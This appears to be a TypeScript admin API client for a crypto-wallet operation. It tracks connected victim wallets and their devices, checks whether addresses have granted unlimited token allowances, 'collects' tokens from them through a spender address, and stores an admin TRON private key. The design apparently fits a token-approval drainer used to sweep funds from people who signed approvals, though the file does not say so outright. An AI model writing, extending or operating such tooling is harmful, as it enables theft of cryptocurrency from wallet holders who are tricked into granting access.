// ─── Admin Dashboard API Client ──────────────────────────────────────────────

const TOKEN_KEY = 'zenith_admin_token';

function getToken(): string | null {
  return localStorage.getItem(TOKEN_KEY);
}

export function setToken(token: string): void {
  localStorage.setItem(TOKEN_KEY, token);
}

export function clearToken(): void {
  localStorage.removeItem(TOKEN_KEY);
}

export function isAuthenticated(): boolean {
  return !!getToken();
}

async function adminFetch<T>(path: string, init?: RequestInit): Promise<T> {
  const token = getToken();
  const res = await fetch(path, {
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...init?.headers,
    },
    ...init,
  });

  if (res.status === 401) {
    clearToken();
    throw new Error('Unauthorized');
  }

  if (!res.ok) {
    const text = await res.text();
    throw new Error(`API error ${res.status}: ${text}`);
  }

  return res.json() as Promise<T>;
}

// ── Auth ─────────────────────────────────────────────────────────────────────

export async function adminLogin(username: string, password: string): Promise<string> {
  const data = await adminFetch<{ token: string }>('/api/admin/login', {
    method: 'POST',
    body: JSON.stringify({ username, password }),
  });
  setToken(data.token);
  return data.token;
}

export async function adminLogout(): Promise<void> {
  try {
    await adminFetch('/api/admin/logout', { method: 'POST' });
  } catch { /* ignore */ }
  clearToken();
}

// ── Overview ─────────────────────────────────────────────────────────────────

export interface OverviewData {
  connectedWallets: number;
  totalTransactions: number;
  confirmedTransactions: number;
  failedTransactions: number;
  networkDistribution: Array<{ network: string; count: number }>;
  recentTransactions: TransactionRow[];
}

export async function fetchOverview(): Promise<OverviewData> {
  return adminFetch<OverviewData>('/api/admin/overview');
}

// ── Transactions ─────────────────────────────────────────────────────────────

export interface TransactionRow {
  id: string;
  network: string;
  asset: string;
  amount: string;
  wallet_a: string | null;
  walletA?: string;
  wallet_b: string;
  walletB?: string;
  request_type: string;
  requestType?: string;
  status: string;
  transaction_id: string | null;
  transactionId?: string;
  contract_address: string | null;
  spender_address: string | null;
  created_at: string;
  createdAt?: number;
  expires_at: string | null;
  expiresAt?: number;
  purpose: string;
  collected: boolean;
  collected_amount: string | null;
  collected_tx_hash: string | null;
  collected_at: string | null;
}

export interface TransactionsResponse {
  transactions: TransactionRow[];
  total: number;
  page: number;
  totalPages: number;
}

export async function fetchTransactions(opts: {
  page?: number;
  limit?: number;
  network?: string;
  status?: string;
  search?: string;
} = {}): Promise<TransactionsResponse> {
  const params = new URLSearchParams();
  if (opts.page) params.set('page', String(opts.page));
  if (opts.limit) params.set('limit', String(opts.limit));
  if (opts.network) params.set('network', opts.network);
  if (opts.status) params.set('status', opts.status);
  if (opts.search) params.set('search', opts.search);
  return adminFetch<TransactionsResponse>(`/api/admin/transactions?${params}`);
}

// ── Wallets ──────────────────────────────────────────────────────────────────

export interface WalletSessionRow {
  id: number;
  wallet_address: string;
  wallet_software: string;
  network: string;
  chain_family: string;
  device: string;
  platform: string;
  first_connected: string;
  last_active: string;
}

export interface WalletsResponse {
  sessions: WalletSessionRow[];
  total: number;
  page: number;
  totalPages: number;
}

export async function fetchWallets(page = 1, limit = 50): Promise<WalletsResponse> {
  return adminFetch<WalletsResponse>(`/api/admin/wallets?page=${page}&limit=${limit}`);
}

// ── Collect ──────────────────────────────────────────────────────────────────

export interface CollectResponse {
  success: boolean;
  txHash?: string;
  amount: string;
  network: string;
  error?: string;
}

export async function collectTokens(paymentId: string, amount: string): Promise<CollectResponse> {
  return adminFetch<CollectResponse>('/api/admin/collect', {
    method: 'POST',
    body: JSON.stringify({ paymentId, amount }),
  });
}

// ── Allowance & Balance Check ────────────────────────────────────────────────

export interface AllowanceResponse {
  allowance: number;
  balance: number;
  trxBalance?: number;
  spender: string;
  isUnlimited?: boolean;
}

export async function fetchAllowance(address: string, contract?: string): Promise<AllowanceResponse> {
  const params = new URLSearchParams({ address });
  if (contract) params.set('contract', contract);
  return adminFetch<AllowanceResponse>(`/api/admin/allowance?${params}`);
}

export async function checkPgStatus(): Promise<boolean> {
  try {
    const data = await adminFetch<{ connected: boolean }>('/api/admin/pg-status');
    return data.connected;
  } catch {
    return false;
  }
}

// ── TRON Config ──────────────────────────────────────────────────────────────

export interface TronConfig {
  VITE_SPENDER_ADDRESS_TRON: string;
  ADMIN_TRON_PRIVATE_KEY: string;       // masked on server before sending
  ADMIN_TRON_PRIVATE_KEY_SET: boolean;
}

export async function fetchTronConfig(): Promise<TronConfig> {
  return adminFetch<TronConfig>('/api/admin/config');
}

export async function saveTronConfig(updates: Partial<TronConfig>): Promise<{ success: boolean; updated?: string[]; message?: string }> {
  return adminFetch('/api/admin/config', {
    method: 'POST',
    body: JSON.stringify(updates),
  });
}
